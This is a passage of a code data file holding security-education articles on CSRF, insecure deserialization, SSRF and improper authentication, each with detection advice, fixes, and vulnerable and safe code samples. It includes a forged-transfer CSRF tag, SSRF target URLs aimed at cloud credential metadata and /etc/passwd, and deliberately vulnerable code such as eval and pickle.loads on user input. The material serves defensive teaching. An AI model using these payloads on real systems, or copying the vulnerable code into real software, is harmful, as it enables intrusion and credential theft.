    readTimeMinutes: 6,
    summary: "CSRF tricks a user's browser into making unwanted requests to a site where they're authenticated, potentially changing passwords, transferring funds, or modifying account settings.",
    whatIsIt: "Cross-Site Request Forgery (CSRF) is an attack where a malicious website causes a user's browser to perform an unwanted action on a different site where the user is currently authenticated. The browser automatically includes cookies (including session cookies) with every request to a domain, so the target site cannot distinguish between a legitimate request and a forged one.\n\nCSRF does not steal data — it forces state-changing actions (transfers, password changes, email updates) on behalf of the victim.",
    howItWorks: "1. User logs into `bank.com` — browser stores a session cookie\n2. User visits `evil.com` (via phishing email, ad, etc.)\n3. `evil.com` contains a hidden form or image tag:\n```html\n<img src=\"https://bank.com/transfer?to=attacker&amount=10000\" />\n```\n4. The browser sends this request to `bank.com` with the user's session cookie\n5. `bank.com` processes the transfer because the session cookie is valid\n\nMore sophisticated attacks use JavaScript to submit POST forms with hidden fields.",
    realWorldExample: "**Netflix (2006):** A CSRF vulnerability allowed attackers to change the shipping address on a user's DVD rental account, redirecting their DVD deliveries.\n\n**ING Direct (2008):** CSRF was used to transfer funds from customer accounts. The attack worked because the banking application relied solely on cookies for authentication.\n\n**WordPress (multiple years):** Various CSRF vulnerabilities have been found in WordPress plugins, allowing attackers to change admin settings, install plugins, or create new admin accounts.",
    howToDetect: "- Check if state-changing endpoints (POST, PUT, DELETE) validate a CSRF token\n- Look for forms without hidden CSRF token fields\n- Test by submitting requests from a different origin without the CSRF token\n- Check `SameSite` cookie attribute — if not set, cookies are sent cross-origin",
    howToFix: "- **Use CSRF tokens** — Generate a unique token per session/request and validate it server-side\n- **SameSite cookies** — Set `SameSite=Strict` or `SameSite=Lax` on session cookies\n- **Check the Origin/Referer header** — Reject requests from unexpected origins\n- **Use custom request headers** — APIs can require a custom header (e.g., `X-Requested-With`) that browsers won't send cross-origin\n- **Double-submit cookie pattern** — Send the CSRF token both as a cookie and a request parameter",
    codeExampleBad: "// VULNERABLE: No CSRF protection on state-changing endpoint\napp.post('/transfer', (req, res) => {\n  const { to, amount } = req.body;\n  // Session cookie is automatically sent — no additional verification\n  transferFunds(req.user.id, to, amount);\n  res.json({ success: true });\n});\n\n// VULNERABLE: Cookie without SameSite\nres.cookie('session', token, { httpOnly: true, secure: true });",
    codeExampleGood: "// SAFE: CSRF token validation\nimport csrf from 'csurf';\nconst csrfProtection = csrf({ cookie: true });\n\napp.post('/transfer', csrfProtection, (req, res) => {\n  // csurf middleware validates the _csrf token\n  transferFunds(req.user.id, req.body.to, req.body.amount);\n  res.json({ success: true });\n});\n\n// SAFE: SameSite cookie\nres.cookie('session', token, {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict'\n});",
    references: [
      "https://owasp.org/www-community/attacks/csrf",
      "https://cwe.mitre.org/data/definitions/352.html",
      "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
    ],
  },
  {
    id: "cwe-502",
    cwe: "CWE-502",
    title: "Insecure Deserialization",
    severity: "HIGH",
    type: "Article",
    readTime: "7 min",
    readTimeMinutes: 7,
    summary: "Insecure deserialization allows attackers to manipulate serialized objects to achieve remote code execution, privilege escalation, or denial of service.",
    whatIsIt: "Serialization converts an object into a format that can be stored or transmitted (JSON, XML, binary). Deserialization is the reverse — reconstructing the object from that format. Insecure deserialization occurs when an application deserializes untrusted data without proper validation, allowing attackers to manipulate the serialized data to execute arbitrary code or alter application logic.\n\nThis is especially dangerous in languages like Java, PHP, Python, and Ruby where deserialization can trigger code execution through 'gadget chains' — sequences of existing class methods that, when chained together, perform malicious actions.",
    howItWorks: "1. Application serializes a user session or object and sends it to the client (e.g., in a cookie)\n2. Attacker modifies the serialized data — changing field values, injecting malicious objects, or constructing gadget chains\n3. Application deserializes the modified data without validation\n4. The deserialization process triggers unintended code execution\n\nIn Node.js/JavaScript, the risk is lower than Java but still present:\n- `JSON.parse()` is generally safe (no code execution)\n- `eval()` or `new Function()` on serialized data is dangerous\n- Libraries like `node-serialize` have known RCE vulnerabilities\n- YAML deserialization (`yaml.load()` in Python) can execute arbitrary code",
    realWorldExample: "**Equifax (2017):** The breach that exposed 147 million records was caused by a deserialization vulnerability in Apache Struts (CVE-2017-5638). Attackers sent a crafted Content-Type header that triggered remote code execution.\n\n**PayPal (2015):** A Java deserialization vulnerability in PayPal's servers allowed researchers to achieve remote code execution. PayPal paid a $30,000 bug bounty.",
    howToDetect: "- Look for deserialization of user-controlled data (cookies, request bodies, URL parameters)\n- Check for use of `eval()`, `unserialize()`, `pickle.loads()`, `ObjectInputStream.readObject()`\n- Aithon Shield's SAST scanner flags unsafe deserialization patterns\n- Test by modifying serialized data in cookies or request bodies",
    howToFix: "- **Don't deserialize untrusted data** — use simple data formats like JSON\n- **Validate before deserializing** — check integrity with HMAC signatures\n- **Use allowlists** — Only allow deserialization of expected classes\n- **Isolate deserialization** — Run in a sandboxed environment with minimal privileges\n- **Keep libraries updated** — Deserialization gadget chains are patched in library updates\n- **In Node.js** — Avoid `eval()`, `node-serialize`, and `js-yaml` with unsafe options",
    codeExampleBad: "// VULNERABLE: eval on user input\nconst userData = eval('(' + req.cookies.session + ')');\n\n// VULNERABLE: node-serialize (known RCE)\nconst serialize = require('node-serialize');\nconst obj = serialize.unserialize(req.body.data);\n\n// VULNERABLE: Python pickle\nimport pickle\ndata = pickle.loads(request.data)  # Arbitrary code execution!",
    codeExampleGood: "// SAFE: JSON.parse (no code execution)\nconst userData = JSON.parse(req.cookies.session);\n\n// SAFE: Validate with schema after parsing\nconst parsed = JSON.parse(req.body.data);\nconst validated = userSchema.parse(parsed); // Zod validation\n\n// SAFE: Sign serialized data to detect tampering\nimport { createHmac } from 'crypto';\nconst signature = createHmac('sha256', SECRET).update(data).digest('hex');\n// Verify signature before deserializing",
    references: [
      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests",
      "https://cwe.mitre.org/data/definitions/502.html",
    ],
  },
  {
    id: "cwe-918",
    cwe: "CWE-918",
    title: "Server-Side Request Forgery (SSRF)",
    severity: "HIGH",
    type: "Article",
    readTime: "7 min",
    readTimeMinutes: 7,
    summary: "SSRF allows attackers to make the server send requests to internal services, cloud metadata endpoints, or other systems that are not directly accessible from the internet.",
    whatIsIt: "Server-Side Request Forgery occurs when an application fetches a remote resource using a user-supplied URL without properly validating it. The attacker can redirect the request to internal services, cloud metadata APIs, or other systems behind the firewall.\n\nSSRF is particularly dangerous in cloud environments because cloud providers expose metadata services (e.g., `http://169.254.169.254/`) that contain IAM credentials, instance configuration, and other sensitive data.",
    howItWorks: "1. Application has a feature that fetches a URL (e.g., 'preview this link', 'import from URL', 'webhook test')\n2. Attacker provides an internal URL: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`\n3. The server makes the request from inside the network, bypassing firewalls\n4. The response (containing AWS credentials) is returned to the attacker\n\nOther targets:\n- `http://localhost:6379/` — Redis (can execute commands)\n- `http://internal-admin.company.com/` — Internal admin panels\n- `file:///etc/passwd` — Local file read (if file:// protocol is allowed)\n- `http://kubernetes.default.svc/` — Kubernetes API",
    realWorldExample: "**Capital One (2019):** An SSRF vulnerability in a misconfigured WAF allowed an attacker to access the AWS metadata service, obtain IAM credentials, and download data on 106 million credit card applicants. The attacker was sentenced to probation and time served.\n\n**GitLab (2021):** An SSRF vulnerability allowed attackers to scan internal networks and access cloud metadata endpoints from GitLab instances.",
    howToDetect: "- Look for any feature that fetches URLs based on user input (webhooks, URL previews, file imports, PDF generators)\n- Test with internal IPs: `127.0.0.1`, `169.254.169.254`, `10.0.0.1`, `[::1]`\n- Test with URL redirects that point to internal addresses\n- Check if the application follows redirects (a URL that 302s to an internal address)\n- Aithon Shield's DAST scanner tests for SSRF in web applications",
    howToFix: "- **Validate and allowlist URLs** — Only allow requests to known, trusted domains\n- **Block internal IP ranges** — Deny requests to `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`\n- **Disable unnecessary URL schemes** — Block `file://`, `gopher://`, `dict://`\n- **Don't follow redirects** — Or re-validate after each redirect\n- **Use IMDSv2** on AWS (requires a token, mitigating simple SSRF)\n- **Network segmentation** — Isolate the application from sensitive internal services",
    codeExampleBad: "// VULNERABLE: Fetching arbitrary user-supplied URL\napp.post('/preview', async (req, res) => {\n  const response = await fetch(req.body.url);\n  const html = await response.text();\n  res.json({ preview: html });\n});\n\n// VULNERABLE: No URL validation for webhook\napp.post('/webhook/test', async (req, res) => {\n  await fetch(req.body.webhookUrl, { method: 'POST', body: '{}' });\n  res.json({ sent: true });\n});",
    codeExampleGood: "// SAFE: Validate URL against allowlist\nimport { URL } from 'url';\n\nconst BLOCKED_RANGES = ['127.', '10.', '172.16.', '192.168.', '169.254.', '0.'];\n\napp.post('/preview', async (req, res) => {\n  const parsed = new URL(req.body.url);\n  \n  // Block non-HTTP(S) schemes\n  if (!['http:', 'https:'].includes(parsed.protocol)) {\n    return res.status(400).json({ error: 'Only HTTP(S) allowed' });\n  }\n  \n  // Block internal IPs\n  if (BLOCKED_RANGES.some(r => parsed.hostname.startsWith(r))) {\n    return res.status(400).json({ error: 'Internal addresses not allowed' });\n  }\n  \n  const response = await fetch(parsed.toString(), { redirect: 'error' });\n  res.json({ preview: await response.text() });\n});",
    references: [
      "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
      "https://cwe.mitre.org/data/definitions/918.html",
    ],
  },
  {
    id: "cwe-287",
    cwe: "CWE-287",
    title: "Improper Authentication",
    severity: "CRITICAL",
    type: "Article",
    readTime: "8 min",
    readTimeMinutes: 8,
    summary: "Improper authentication allows attackers to bypass login mechanisms, impersonate users, or access protected resources without valid credentials.",
    whatIsIt: "CWE-287 covers a broad range of authentication weaknesses — any situation where the application fails to properly verify that a user is who they claim to be. This includes missing authentication on sensitive endpoints, weak password requirements, broken session management, and flawed multi-factor authentication.\n\nAuthentication is the front door of your application. If it's broken, nothing else matters — attackers have full access.",
    howItWorks: "Common authentication failures:\n\n**Missing authentication:** API endpoints that should require login but don't check for a session/token.\n\n**Credential stuffing:** Attackers use lists of stolen username/password pairs from other breaches. Without rate limiting, they can try millions of combinations.\n\n**Session fixation:** Attacker sets a known session ID before the victim logs in, then uses that same session ID to hijack the authenticated session.\n\n**JWT vulnerabilities:** Using `alg: none`, weak signing keys, or not validating token expiration.\n\n**Password reset flaws:** Predictable reset tokens, reset links that don't expire, or sending passwords in email.",
    realWorldExample: "**Facebook (2019):** A vulnerability in the 'View As' feature allowed attackers to steal access tokens for 50 million accounts. The tokens could be used to log in as any affected user without knowing their password.\n\n**Zoom (2020):** Zoom meetings could be joined without authentication (Zoom-bombing), and the waiting room feature could be bypassed. This led to widespread unauthorized access to private meetings.",
    howToDetect: "- Review all API endpoints — are any missing authentication middleware?\n- Check password policies — minimum length, complexity requirements\n- Test session management — do sessions expire? Are they invalidated on logout?\n- Check for rate limiting on login endpoints\n- Verify JWT validation — algorithm, expiration, signature\n- Aithon Shield's SAST scanner detects missing auth middleware patterns",
    howToFix: "- **Require authentication on all sensitive endpoints** — use middleware (like Aithon Shield's `requireAuth`)\n- **Implement rate limiting** — block after N failed login attempts\n- **Use strong password hashing** — bcrypt or argon2 with appropriate cost factors\n- **Enforce MFA** — especially for admin accounts and sensitive operations\n- **Secure session management** — HttpOnly, Secure, SameSite cookies; regenerate session ID on login\n- **Validate JWTs properly** — check algorithm, expiration, issuer, and signature",
    codeExampleBad: "// VULNERABLE: No authentication on sensitive endpoint\napp.delete('/api/users/:id', async (req, res) => {\n  await db.delete(users).where(eq(users.id, req.params.id));\n  res.json({ deleted: true });\n});\n\n// VULNERABLE: No rate limiting on login\napp.post('/api/login', async (req, res) => {\n  const user = await findUser(req.body.email);\n  if (await bcrypt.compare(req.body.password, user.password)) {\n    req.session.userId = user.id;\n    res.json({ success: true });\n  }\n});",
    codeExampleGood: "// SAFE: Authentication required\napp.delete('/api/users/:id', requireAuth, async (req, res) => {\n  // Also check authorization — can this user delete this account?\n  if (req.user.id !== req.params.id && req.user.role !== 'admin') {\n    return res.status(403).json({ error: 'Forbidden' });\n  }\n  await db.delete(users).where(eq(users.id, req.params.id));\n  res.json({ deleted: true });\n});\n\n// SAFE: Rate limiting on login\nimport rateLimit from 'express-rate-limit';\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 });\napp.post('/api/login', loginLimiter, async (req, res) => { /* ... */ });",
    references: [
      "https://cwe.mitre.org/data/definitions/287.html",
      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/",
    ],
  },
];
